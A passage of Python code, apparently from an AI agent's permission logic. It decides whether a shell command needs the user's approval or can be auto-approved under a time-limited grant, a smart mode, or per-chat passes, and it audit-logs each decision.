        reasons = _reasons_for(store, command, cwd, smart)
        passed = set()
        if smart:
            passed = kinds_passed(store, session_id, clock())
        missing = [why for why in reasons if why not in passed]
        audit_args = {"command": command, "cwd": cwd}
        if missing:
            store.audit("agent", "shell_asked_under_grant", tool="run_shell", args=audit_args,
                        result_summary=missing[0], session_id=session_id)
            return True

        allowed_because = "allowed for 30 min"
        if smart:
            allowed_because = "allowed by smart mode"
        if reasons:  # every one covered by this chat's passes
            allowed_because = f"{CHAT_PASS} ({', '.join(reasons)})"
            audit_args["call_id"] = getattr(tool_context, "function_call_id", None)
        store.audit("agent", "shell_auto_approved", tool="run_shell", args=audit_args,
                    result_summary=allowed_because, session_id=session_id)
        return False
    return needs_tap
